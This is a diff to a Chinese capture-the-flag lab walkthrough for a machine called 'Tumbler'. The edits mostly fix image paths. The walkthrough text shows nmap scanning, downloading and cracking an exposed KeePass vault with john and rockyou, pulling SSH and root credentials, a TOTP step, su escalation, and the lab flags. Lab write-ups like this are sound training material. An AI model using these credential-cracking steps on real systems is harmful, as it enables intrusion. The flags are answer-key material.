@@ -9,7 +9,7 @@ tags:
   - 靶机
   - WP
   - Tumbler
-featured:
+featured: false
 ---
 
 ## 1. 信息收集
@@ -17,7 +17,7 @@ featured:
 ```
 nmap -Pn -sV -p- 192.168.56.131
 ```
-![](<../屏幕截图 2026-11-01 172123.png>)
+![](<images/屏幕截图 2026-11-01 172123.png>)
 用浏览器打开`192.168.56.131`界面，页面暴露`/keeweb/`和`/vault/ops.kdbx/`
 
 ## 2. 下载密码库
@@ -26,7 +26,7 @@ mkdir -p ~/tumbler && cd ~/tumbler
 curl -s -k -o ops.kdbx https://192.168.56.130/vault/ops.kdbx
 file ops.kdbx
 ```
-![](<../Pasted image 20261101172732.png>)
+![](<images/Pasted image 20261101172732.png>)
 
 ## 3. 爆破/打开库
 ```
@@ -34,7 +34,7 @@ keepass2john ops.kdbx > ops.hash
 john --format=keepass --wordlist=/usr/share/wordlists/rockyou.txt ops.hash
 john --show --format=keepass ops.hash
 ```
-![](<../Pasted image 20261101173649.png>)
+![](<images/Pasted image 20261101173649.png>)
 从中拿到主密码：`hollister1`
 
 ## 4. 查看密码库内容
@@ -42,13 +42,13 @@ john --show --format=keepass ops.hash
 ```
 keepassxc-cli ls /home/kali/tumbler/ops.kdbx
 ```
-![](<../Pasted image 20261101180547.png>)
+![](<images/Pasted image 20261101180547.png>)
 ```
 keepassxc-cli show -s \
 /home/kali/tumbler/ops.kdbx \
 "tumbler-ops (ssh)"
 ```
-![](<../Pasted image 20261101180611.png>)
+![](<images/Pasted image 20261101180611.png>)
 因此获得SSH凭据：
 ```
 用户名：ll104567
@@ -59,7 +59,7 @@ keepassxc-cli show -s \
 ```
 ssh ll104567@192.168.56.131
 ```
-![](<../Pasted image 20261101180847.png>)
+![](<images/Pasted image 20261101180847.png>)
 得到user flag
 ```
 flag{user-ac10431c73046b9a9579e14e2f9f2669}
@@ -79,7 +79,7 @@ scp ll104567@192.168.56.131:/srv/vault/breakglass.kdbx \
 ```
 Garnet-Tumbler-42x
 ```
-![](<../Pasted image 20261101185151.png>)
+![](<images/Pasted image 20261101185151.png>)
 复制成功后，回到 SSH 会话，读取 Vim 残留：
 
 ```
@@ -91,7 +91,7 @@ cat /home/kvops/.viminfo
 ```
 master: Tumbler-BreakGlass-9f2c!
 ```
-![](<../Pasted image 20261101185257.png>)
+![](<images/Pasted image 20261101185257.png>)
 因此得到：
 
 ```
@@ -118,7 +118,7 @@ Tumbler-BreakGlass-9f2c!
 root (emergency access)
 Recycle Bin/
 ```
-![](<../Pasted image 20261101185351.png>)
+![](<images/Pasted image 20261101185351.png>)
 查看全部字段：
 
 ```
@@ -126,7 +126,7 @@ keepassxc-cli show --all -s \
 /home/kali/tumbler/breakglass.kdbx \
 "root (emergency access)"
 ```
-![](<../Pasted image 20261101185427.png>)
+![](<images/Pasted image 20261101185427.png>)
 关键输出：
 
 ```
@@ -160,7 +160,7 @@ keepassxc-cli show -t \
 ```
 
 输出一个 6 位验证码后，需要立即使用，因为验证码约 30 秒后失效。
-![](<../Pasted image 20261101185608.png>)
+![](<images/Pasted image 20261101185608.png>)
 ## 9. 使用 `su` 提权
 
 回到 SSH 会话：
@@ -201,4 +201,4 @@ cat /root/root.txt
 ```
 flag{root-f2c867b95b4138f920982dfa6d647c40}
 ```
-![](<../Pasted image 20261101185646.png>)
+![](<images/Pasted image 20261101185646.png>)
